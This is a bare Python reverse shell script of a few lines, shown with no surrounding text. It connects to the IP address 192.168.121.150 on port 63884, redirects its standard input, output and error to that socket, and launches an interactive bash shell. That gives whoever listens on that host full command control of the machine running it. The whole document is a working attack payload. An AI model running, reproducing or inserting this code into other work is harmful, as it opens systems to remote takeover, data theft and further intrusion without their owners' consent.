import socket, subprocess, os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.121.150", 63884));
os.dup2(s.fileno(), 0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
o=subprocess.call(["/bin/bash", "-i"]);

